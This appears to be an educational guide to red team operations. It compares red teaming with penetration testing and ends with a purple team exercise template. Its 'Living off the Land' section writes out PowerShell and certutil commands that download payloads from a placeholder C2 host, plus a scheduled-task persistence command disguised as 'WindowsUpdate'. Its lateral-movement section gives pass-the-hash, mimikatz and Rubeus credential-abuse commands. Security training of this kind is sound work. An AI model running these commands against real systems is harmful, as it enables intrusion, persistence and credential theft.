# Red Team Operations

Red teaming simulates advanced persistent threats (APTs) to test an organization's detection and response capabilities.

## Red Team vs Penetration Testing

| Aspect | Penetration Test | Red Team |
|--------|-----------------|----------|
| Goal | Find vulnerabilities | Test detection & response |
| Scope | Defined systems | Full organization |
| Duration | Days-weeks | Weeks-months |
| Awareness | Often known to IT | Typically unknown (purple team excepted) |
| Focus | Technical | People, process, technology |

## Advanced Attack Techniques

### Living off the Land (LotL)

```powershell
# Use legitimate tools to avoid detection
# PowerShell download cradle
IEX (New-Object Net.WebClient).DownloadString('http://c2/payload.ps1')

# certutil abuse
certutil -urlcache -split -f http://c2/payload.exe payload.exe

# Scheduled task persistence
schtasks /create /tn "WindowsUpdate" /tr "C:\payload.exe" /sc onlogon /ru SYSTEM
```

### C2 Infrastructure

```
Attacker ──→ [Redirectors] ──→ [C2 Server]
                                    ↕
                              [Compromised hosts]

# Tools: Cobalt Strike, Sliver, Havoc, Metasploit
```

### Lateral Movement

```bash
# Pass-the-Hash
impacket-psexec -hashes :NTLM_HASH administrator@192.168.1.100

# Pass-the-Ticket (Kerberos)
mimikatz: sekurlsa::tickets /export
Invoke-Rubeus: asktgt /user:admin /certificate:cert.pfx

# Remote execution
impacket-wmiexec domain/user:password@target
evil-winrm -i 192.168.1.100 -u user -p password
```

## Purple Team Exercise Template

```
1. Define scenario (e.g., phishing → ransomware)
2. Red team executes attack
3. Blue team monitors and responds
4. Document: detection gaps, response time, missed indicators
5. Improve detections and playbooks
6. Re-test
```
